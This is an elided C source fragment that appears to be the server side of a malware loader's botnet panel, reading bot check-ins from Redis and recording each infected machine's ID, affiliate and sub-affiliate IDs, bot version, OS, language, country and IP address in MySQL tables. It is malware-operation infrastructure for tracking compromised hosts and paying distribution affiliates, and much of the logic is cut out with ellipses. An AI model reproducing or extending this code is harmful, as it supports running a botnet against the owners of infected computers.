...
#define MINOR_ROFFLOADER_VERSION 83
		...
		for (i = 0; i < redisTses->elements; ++i) {
			...
			for (n = 0; n < iterCount; ++n) {
				...
				for (k = 0; k < redisReply->elements; ++k) {
					...
					nValues = sscanf(redisReply->element[k]->str, "%lld %u %s %u %u %u %u %u %u %u %s %u", &iid, &isNewBot, uniqid, &dtf, &dtl, &affId, &subId, &ver, &osVer, &osLang, countryCode, &ip);
					if (nValues != 12) {
					...
					if (isNewBot) {
						...
						snprintf(query, 1024, "INSERT INTO bots(id,uniqid,aff_id,sub_id,dtf,dtl,bot_ver,os_ver,os_lang,cc) VALUES(%lld,'%.64s',%u,%u,%u,%u,%u,%u,%u,'%.2s');"
									 "INSERT INTO bots_histories(bot_id,bot_ver,os_ver,os_lang,cc,start_dt) VALUES(%lld,%u,%u,%u,'%.2s',%u);"
									 "INSERT INTO bots_ips(bot_id, ip, start_dt) VALUES(%lld,%u,%u);"
									 "INSERT INTO bots_activities(bot_id, conn_dt, day) VALUES(%lld,%u,%u)",
							iid, uniqid, affId, subId, dtf, dtl, ver, osVer, osLang, countryCode,
							iid, ver, osVer, osLang, countryCode, dtl,
							iid, ip, dtl,
							iid, dtl, dayTm);
						BEGIN_PERF;
						...
						snprintf(query, 1024, "SELECT bot_ver,os_ver,os_lang,cc FROM bots WHERE id=%lld", iid);
						BEGIN_PERF;
						mysqlErr = db_query(&mysql, query);
						END_PERF(query);
						if (mysqlErr != ERR_OK) {
						...
						if (mysqlResult != NULL) {
							...
							if (numRows > 0) {
								...
								if (ver != dbVer || osVer != dbOsVer ||  osLang != dbOsLang || strcmp(countryCode, dbCC) != 0) {
									snprintf(query, 1024, "UPDATE bots SET bot_ver=%u,os_ver=%u,os_lang=%u,cc='%.2s',dtl=%u WHERE id=%lld;"
												 "UPDATE bots_histories SET end_dt=%u WHERE bot_id=%lld AND end_dt IS NULL;"
												 "INSERT INTO bots_histories(bot_id,bot_ver,os_ver,os_lang,cc,start_dt) VALUES(%lld,%u,%u,%u,'%.2s',%u)", 
										ver, osVer, osLang, countryCode, dtl, iid,
										dtl, iid,
										iid, ver, osVer, osLang, countryCode, dtl);
									
								}
								else {
									snprintf(query, 1024, "UPDATE bots SET dtl=%u WHERE id=%lld", 
										dtl, iid);
								}
								...
								snprintf(query, 1024, "SELECT ip FROM bots_ips WHERE bot_id = %lld AND end_dt IS NULL", 
									iid);
								BEGIN_PERF;
								mysqlErr = db_query(&mysql, query);
								END_PERF(query);
								...
								if (mysqlResult != NULL) {
									...
									if (numRows <= 0) {
										...
										snprintf(query, 1024, "INSERT INTO bots_ips(bot_id,ip,start_dt) values(%lld,%u,%u)", 
											iid, ip, dtl);
										BEGIN_PERF;
										mysqlErr = db_query(&mysql, query);
										END_PERF(query);
										...
										mysqlRow = mysql_fetch_row(mysqlResult);
										dbIp = (uint32_t)atoi(mysqlRow[0]);
										if (ip != dbIp) {
											snprintf(query, 1024, "UPDATE bots_ips SET end_dt=%u where bot_id=%lld AND end_dt IS NULL;"
														 "INSERT INTO bots_ips(bot_id,ip,start_dt) VALUES(%lld,%u,%u)", 
												dtl, iid,
												iid, ip, dtl);
											BEGIN_PERF;
						...
						snprintf(query, 1024, "INSERT INTO bots_activities(bot_id, conn_dt, day) VALUES(%lld,%u,%u)", 
							iid, dtl, dayTm);
						BEGIN_PERF;
						mysqlErr = db_query(&mysql, query);
						END_PERF(query);
